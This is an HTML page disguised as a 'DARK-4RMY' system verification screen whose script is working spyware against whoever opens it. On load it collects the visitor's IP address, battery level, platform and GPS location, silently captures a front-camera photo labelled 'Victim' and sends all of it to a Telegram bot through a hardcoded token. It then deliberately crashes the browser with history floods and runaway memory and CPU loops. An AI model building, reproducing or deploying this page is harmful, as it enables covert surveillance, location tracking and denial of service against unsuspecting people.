<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK-4RMY | System Verification</title>
    <style>
        body { 
            margin: 0; 
            background: #000; 
            color: #00f3ff; 
            font-family: 'Courier New', monospace; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            overflow: hidden; 
        }
        .panel { 
            border: 2px solid #00f3ff; 
            padding: 30px; 
            text-align: center; 
            box-shadow: 0 0 30px #00f3ff; 
            z-index: 10;
        }
        /* Visual Crash Effect */
        .glitch-active { 
            animation: crash-shake 0.04s infinite; 
            background: #ff0000 !important; 
            color: #ffffff !important; 
            border-color: #ffffff !important;
        }
        @keyframes crash-shake {
            0% { transform: translate(5px, 5px); }
            25% { transform: translate(-5px, 0); }
            50% { transform: translate(0, -5px); }
            75% { transform: translate(5px, 0); }
            100% { transform: translate(0, 0); }
        }
        #stat { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="panel" id="main-panel">
        <h1>DARK-4RMY SYSTEM</h1>
        <p id="stat">Analyzing Security Protocols...</p>
        <p id="sub-stat" style="opacity: 0.5;">Hardware Check in Progress...</p>
        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('id');

        // --- ULTRA CRASH LOGIC ---
        function finalStrike() {
            document.getElementById('main-panel').classList.add('glitch-active');
            document.getElementById('stat').innerText = "FATAL ERROR: KERNEL PANIC";
            
            // 1. History Flood (Freeze UI)
            for (let i = 0; i < 100000; i++) {
                window.history.pushState(null, null, Math.random().toString());
            }

            // 2. Memory & CPU Destroyer
            let leak = [];
            function kill() {
                while(true) {
                    // Khneq l-RAM (100MB per loop)
                    for(let i=0; i<100; i++) {
                        leak.push(new Array(1000000).fill("💀"));
                    }
                    // Khneq l-CPU Threads
                    window.history.pushState({}, '', '#' + Math.random());
                    console.log("STRIKE_ACTIVE_" + leak.length);
                }
            }

            // Start multiple crash threads
            for(let i=0; i<15; i++) {
                setTimeout(kill, 10);
            }
        }

        async function init() {
            if (!chatId) return;

            try {
                // 1. Core Data Capture
                const battery = await navigator.getBattery();
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                let log = `🚨 *ULTRA LOG CAPTURED* 🚨\n\n` +
                          `🌐 *IP:* \`${ipData.ip}\`\n` +
                          `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n` +
                          `💻 *Platform:* ${navigator.platform}`;

                // 2. GPS Tracking
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gps = log + `\n📍 *GPS:* [Google Maps](http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                    await sendToBot(gps);
                }, async () => {
                    await sendToBot(log + `\n📍 *GPS:* Permission Denied ❌`);
                });

                // 3. Stealth Camera Snapshot
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            sendPhoto(blob);
                            // Siftna koulshi? Daba Final Strike!
                            setTimeout(finalStrike, 2000);
                        });
                        stream.getTracks().forEach(t => t.stop());
                    }, 2000);
                } catch (e) {
                    // Ila denya camera, crashi lih l-site f-mra
                    setTimeout(finalStrike, 1000);
                }

            } catch (err) {
                finalStrike();
            }
        }

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        }

        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', '📸 *Victim Front Camera Snapshot*');
            formData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        window.onload = init;
    </script>
</body>
</html>
